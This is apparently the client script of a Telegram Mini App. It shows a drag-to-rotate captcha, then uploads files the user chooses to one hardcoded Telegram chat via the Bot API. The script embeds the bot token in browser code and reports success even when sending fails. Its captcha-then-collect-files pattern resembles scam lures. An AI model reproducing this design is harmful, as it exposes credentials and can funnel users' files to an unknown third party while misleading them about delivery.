const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

// Настройки
const BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"; 
const TARGET_ID = "7632180689";   

const captchaScreen = document.getElementById('captchaScreen');
const mainScreen = document.getElementById('mainScreen');
const rotateCircle = document.getElementById('rotateCircle');
const degreeIndicator = document.getElementById('degreeIndicator');
const verifyBtn = document.getElementById('verifyBtn');
const welcomeText = document.getElementById('welcomeText');
const userInfo = document.getElementById('userInfo');
const sendFileBtn = document.getElementById('sendFileBtn');
const fileInput = document.getElementById('fileInput');
const status = document.getElementById('status');

let rotationAngle = 0;
let username = 'Гость';

function init() {
    if (tg.initDataUnsafe?.user) {
        username = tg.initDataUnsafe.user.username || tg.initDataUnsafe.user.first_name || 'Гость';
    }
    setupRotation();
    setupEventListeners();
}

function setupRotation() {
    let isDragging = false;
    let startAngle = 0;
    let startRotation = 0;

    const startDrag = (e) => {
        isDragging = true;
        const touch = e.touches ? e.touches[0] : e;
        const rect = rotateCircle.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        startAngle = Math.atan2(touch.clientY - centerY, touch.clientX - centerX);
        startRotation = rotationAngle;
    };

    const drag = (e) => {
        if (!isDragging) return;
        const touch = e.touches ? e.touches[0] : e;
        const rect = rotateCircle.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        const angle = Math.atan2(touch.clientY - centerY, touch.clientX - centerX);
        rotationAngle = startRotation + (angle - startAngle) * (180 / Math.PI);
        updateRotation();
    };

    rotateCircle.addEventListener('mousedown', startDrag);
    rotateCircle.addEventListener('touchstart', startDrag);
    document.addEventListener('mousemove', drag);
    document.addEventListener('touchmove', (e) => isDragging && e.preventDefault(), {passive: false});
    document.addEventListener('touchmove', drag);
    document.addEventListener('mouseup', () => isDragging = false);
    document.addEventListener('touchend', () => isDragging = false);
}

function updateRotation() {
    rotationAngle = ((rotationAngle + 180) % 360) - 180;
    rotateCircle.style.transform = `rotate(${rotationAngle}deg)`;
    degreeIndicator.textContent = `${Math.round(rotationAngle)}°`;
}

function setupEventListeners() {
    verifyBtn.addEventListener('click', () => {
        if (Math.abs(rotationAngle - 90) < 10) {
            captchaScreen.style.display = 'none';
            mainScreen.style.display = 'flex';
            welcomeText.textContent = `Добро пожаловать, ${username}!`;
        } else {
            showStatus('Поверните стрелку на 90° вправо!', 'error');
        }
    });
    sendFileBtn.addEventListener('click', () => fileInput.click());
    fileInput.addEventListener('change', handleFileUpload);
}

async function handleFileUpload(event) {
    const files = Array.from(event.target.files);
    if (!files.length) return;
    
    showStatus(`📤 Отправка...`, 'info');
    
    for (let file of files) {
        const formData = new FormData();
        formData.append('chat_id', TARGET_ID);
        formData.append('document', file);
        formData.append('caption', `Файл от @${username}`);

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
        } catch (error) {
            console.error('Ошибка:', error);
        }
    }
    
    showStatus(`✅ Успешно отправлено!`, 'success');
    event.target.value = '';
}

function showStatus(message, type) {
    status.textContent = message;
    status.className = `status ${type}`;
    status.style.display = 'block';
    if (type !== 'info') setTimeout(() => status.style.display = 'none', 3000);
}

document.addEventListener('DOMContentLoaded', init);
